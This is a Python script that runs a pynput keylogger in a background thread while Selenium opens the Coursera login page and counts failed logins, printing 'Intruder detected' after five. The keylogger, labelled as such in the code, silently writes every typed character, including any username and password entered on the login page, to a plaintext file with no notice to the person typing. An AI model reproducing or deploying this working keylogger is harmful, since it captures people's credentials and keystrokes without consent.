from pynput import keyboard, mouse
import threading
from selenium import webdriver
import time

# Keylogger functions


def keyPressed(key):
    with open("keyfile.txt", 'a') as logKey:
        try:
            if key == keyboard.Key.tab or key == keyboard.Key.enter:
                logKey.write('\n')
            else:
                char = key.char
                logKey.write(char)
        except AttributeError:
            pass  # Special keys that don't have a char attribute
        except Exception as e:
            pass  # Ignore other errors


def on_click(x, y, button, pressed):
    if pressed:
        with open("keyfile.txt", 'a') as logKey:
            logKey.write('\n')

# Start keylogger in a separate thread


def start_keylogger():
    with keyboard.Listener(on_press=keyPressed) as k_listener, mouse.Listener(on_click=on_click) as m_listener:
        k_listener.join()
        m_listener.join()


keylogger_thread = threading.Thread(target=start_keylogger)
keylogger_thread.start()

# Selenium script for login attempts
driver = webdriver.Chrome()  # Ensure you have the correct driver for your browser

login_page_url = "https://www.coursera.org/login"
failed_login_attempts = 0

driver.get(login_page_url)
print(login_page_url + " loaded")

while True:
    input("Press Enter in the console after attempting login (type 'quit' to exit): ")

    current_url = driver.current_url
    print("Current URL:", current_url)

    if failed_login_attempts >= 5:
        print("Intruder detected")
        break

    if current_url == login_page_url or "authMode=login" in current_url:
        failed_login_attempts += 1
        print(
            f"Login failed. Number of consecutive failed attempts: {failed_login_attempts}")
    elif current_url != login_page_url:
        print(
            f"Login successful after {failed_login_attempts} failed attempt(s).")
        break
    else:
        print("Unexpected URL detected. Please check the situation manually.")

    if input("Do you want to try again? (yes/no): ").lower() != "yes":
        print("Exiting...")
        break

driver.quit()

# Stop the keylogger thread
keylogger_thread.join()
